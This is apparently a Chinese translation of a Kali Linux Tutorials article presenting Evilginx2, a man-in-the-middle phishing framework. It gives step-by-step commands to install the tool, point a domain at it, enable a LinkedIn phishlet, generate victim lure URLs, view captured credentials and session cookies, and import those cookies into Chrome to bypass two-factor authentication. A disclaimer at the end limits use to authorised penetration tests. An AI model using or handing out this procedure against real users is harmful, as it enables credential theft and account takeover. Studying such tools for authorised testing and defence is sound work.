# evil ginx 2–独立的 MITM 攻击框架，用于网络钓鱼登录凭据和会话 Cookies，允许绕过双因素身份验证

> 原文：<https://kalilinuxtutorials.com/evilginx2-mitm-attack/>

**Evilginx2** 是一个中间人攻击框架，用于钓鱼登录凭证和会话 cookies，从而允许绕过双因素身份验证保护。

该工具是 2017 年发布的 Evilginx 的继任者，该工具使用 nginx HTTP server 的自定义版本来提供中间人功能，以充当浏览器和钓鱼网站之间的代理。目前的版本完全是作为一个独立的应用程序在 GO 中编写的，它实现了自己的 HTTP 和 DNS 服务器，这使得它非常容易设置和使用。

## **eviginx 2 安装**

您可以为您的架构使用预编译的二进制包，也可以从源代码编译 **evilginx2** 。你将需要一个外部服务器来托管你的 **evilginx2** 安装。

Evilginx 在最基本的 Debian 8 VPS 上运行得非常好。

**也读作[imR0T——加密给你的 Whatsapp 联系人](https://kalilinuxtutorials.com/imr0t-encryption-whatsapp-contact/)**

#### **从源安装**

为了从源代码编译，请确保您已经安装了版本至少为 **1.10.0** 的 **GO** (从此处获取)并且`**$GOPATH**`环境变量设置正确(def。 **`$HOME/go`** )。

安装完成后，将此添加到您的`**~/.profile**`中，假设您在 **`/usr/local/go`** 中安装了 **GO** :

```
`export GOPATH=$HOME/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin` 
```

然后用 **`source ~/.profiles`** 加载。

现在你应该准备好安装 **evilginx2** 了。请遵循以下说明:

```
**sudo apt-get install git make
go get -u github.com/kgretzky/evilginx2
cd $GOPATH/src/github.com/kgretzky/evilginx2
make** 
```

您现在可以从本地目录运行 **evilginx2** ,如下所示:

```
**sudo ./bin/evilginx -p ./phishlets/** 
```

或者全局安装:

```
`sudo make install
sudo evilginx` 
```

以上说明也可用于将 **evilginx2** 更新至最新版本。

#### **用 Docker 安装**

您可以从 Docker 中启动 **evilginx2** 。首先构建容器:

```
**docker build . -t evilginx2** 
```

然后，您可以运行容器:

```
`docker run -it -p 53:53/udp -p 80:80 -p 443:443 evilginx2` 
```

Phishlets 在`/app/phishlets`被加载到容器中，该容器可以作为一个卷进行安装和配置。

#### **从预编译的二进制包安装**

从这里拿起你想要的包裹，放在你的箱子上。然后做:

```
**unzip <package_name>.zip -d <package_name>
cd <package_name>** 
```

如果要进行系统范围的安装，请使用具有 root 权限的安装脚本:

```
**chmod 700 ./install.sh
sudo ./install.sh
sudo evilginx** 
```

或者从当前目录启动 **evilginx2** (您还需要 root 权限):

```
**chmod 700 ./evilginx
sudo ./evilginx** 
```

## **用途**

确保**`TCP 443`**`**TCP 80**`和`**UDP 53**`端口上没有服务监听。您可能需要关闭 apache 或 nginx 以及任何可能正在运行的用于解析 DNS 的服务。 **evilginx2** 会在启动时告诉你它是否无法打开这些端口上的监听套接字。

默认情况下， **evilginx2** 会在`**./phishlets/**`目录中查找网页小册子，之后在 **`/usr/share/evilginx/phishlets/`** 中查找。如果您想要指定一个自定义路径来加载网页仿冒网站，请在启动该工具时使用`**-p <phishlets_dir_path>**`参数。

```
`Usage of ./evilginx:
  -debug
        Enable debug output
  -developer
        Enable developer mode (generates self-signed certificates for all hostnames)
  -p string
        Phishlets directory path` 
```

你应该看到 **evilginx2** 的标志，并提示输入命令。如果您想查看可用的命令或关于它们的更多详细信息，请键入 **`help`** 或 **`help <command>`** 。

## **入门**

要启动并运行，您需要首先做一些设置。

此时，我假设您已经注册了一个域(姑且称之为 **`yourdomain.com`** )，并且在您的域提供商的管理面板中设置了域名服务器(包括`ns1`和`ns2`)以指向您的服务器的 IP(例如 10.0.0.1):

```
`ns1.yourdomain.com = 10.0.0.1
ns2.yourdomain.com = 10.0.0.1` 
```

使用以下命令设置服务器的域和 IP:

```
`config domain yourdomain.com
config ip 10.0.0.1` 
```

现在，您可以设置想要使用的 phishlet。为了这个简短的指南，我们将使用一个 LinkedIn phishlet。为网页仿冒网站设置主机名(显然必须包含您的域名):

```
`phishlets hostname linkedin my.phishing.hostname.yourdomain.com` 
```

现在您可以`enable`phish let，如果在本地没有找到您选择的主机名的证书，它将自动检索 LetsEncrypt SSL/TLS 证书:

```
**phishlets enable linkedin** 
```

您的钓鱼网站现已上线。想想这个 URL，您希望受害者在成功登录后被重定向到该 URL，并获得如下钓鱼 URL(受害者将被重定向到`**https://www.google.com**`):

```
`phishlets get-url linkedin https://www.google.com` 
```

正在运行的网页仿冒网站只会对标记化的链接做出响应，因此任何扫描您的主域的扫描器都将被重定向到指定为 **`config`** 下的 **`redirect_url`** 的 URL。如果你想隐藏你的网页仿冒网站，让它甚至对有效的令牌化网页仿冒网址都不作出响应，使用`**phishlet hide/unhide <phishlet>**`命令。

您可以使用以下工具监控捕获的凭据和会话 cookies:

```
`sessions` 
```

要获得关于捕获会话的详细信息，使用会话 cookie 本身(它将以 JSON 格式打印在底部)，选择它的会话 ID:

```
`sessions <id>` 
```

可以使用 EditThisCookie 扩展将捕获的会话 cookie 复制并导入到 Chrome 浏览器中。

如果你想让 **evilginx2** 在你退出服务器后继续运行，你应该在`screen`会话中运行它。

## **免责声明**

我们非常清楚 Evilginx 可能被用于邪恶的目的。这项工作只是演示了熟练的攻击者可以做什么。防御方有责任考虑此类攻击，并找到保护其用户免受此类网络钓鱼攻击的方法。Evilginx 应仅在合法的渗透测试任务中使用，并获得潜在相关方的书面许可。

[T2**贷项:古巴格雷茨基**](https://github.com/kgretzky/evilginx2)